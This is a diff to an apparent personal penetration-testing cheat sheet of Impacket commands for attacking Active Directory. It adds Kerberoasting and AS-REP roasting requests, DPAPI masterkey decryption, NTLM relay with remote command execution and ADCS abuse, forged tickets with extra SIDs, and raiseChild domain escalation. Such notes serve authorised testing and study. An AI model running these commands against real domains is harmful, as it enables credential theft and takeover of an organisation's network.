@@ -195,8 +195,9 @@ Refer to Kerberoasting.
 $ impacket-GetUserSPNs EXAMPLE.COM/username -k -no-pass
 $ impacket-GetUserSPNs EXAMPLE.COM/username@EXAMPLE.COM -k -no-pass
 $ impacket-GetUserSPNs -dc-ip IP domain/user:password # list all
-$ impacket-GetUserSPNs -dc-ip IP domain/user:password -request # get TGS for all
-$ impacket-GetUserSPNs -dc-ip IP domain/user:password -request-user cn -outputfile cn_tgs # get TGS for 'cn'
+$ impacket-GetUserSPNs [...] -request # get TGS for all
+$ impacket-GetUserSPNs [...] -request-user cn
+$ impacket-GetUserSPNs [...] -outputfile cn_tgs
 $ impacket-GetUserSPNs [...] -target-domain dev.example.com
 ```
 
@@ -205,6 +206,7 @@ $ impacket-GetUserSPNs [...] -target-domain dev.example.com
 Refer to asreproasting.
 
 ```shell!
+$ impacket-GetNPUsers -dc-ip DC01 domain/username:password
 $ impacket-GetNPUsers -dc-ip IP -usersfile valid_users.txt domain/junkusername -no-pass
 ```
 
@@ -244,6 +246,12 @@ $ impacket-lookupsid username:password@IP
 $ impacket-lookupsid -domain-sids username:password@IP
 ```
 </div><div>
+
+#### rpcdump
+
+```shell!
+$ impacket-rpcdump @DCIP
+```
 </div></div>
 
 <hr class="sep-both">
@@ -256,6 +264,20 @@ Stuff that I found, but never read/used yet.
 
 ```shell!
 $ impacket-dpapi unprotect -file xxx -key "xxx"
+$ impacket-dpapi masterkey -file H-I-J-K-L -sid S-A-B-C-D-E-F-G -password password
+```
+
+```shell!
+$ impacket-ntlmrelayx --no-http-server -smb2support -t IP -c '<command>'
+$ impacket-ntlmrelayx -debug -smb2support --target http://target/certsrv/certfnsh.asp --adcs --template DomainController
+$ impacket-ntlmrelayx --no-http-server -smb2support -t IP -c '<command>'
+```
+```shell!
+$ impacket-ticketer -nthash <krbtgt hash> -domain dev.example.com -domain-sid <child domain SID> -extra-sid <target domain SID> dummy
 ```
 </div><div>
+
+```shell!
+$ impacket-raiseChild -target-exec 172.16.5.5 dev.example.com/username:password
+```
 </div></div>
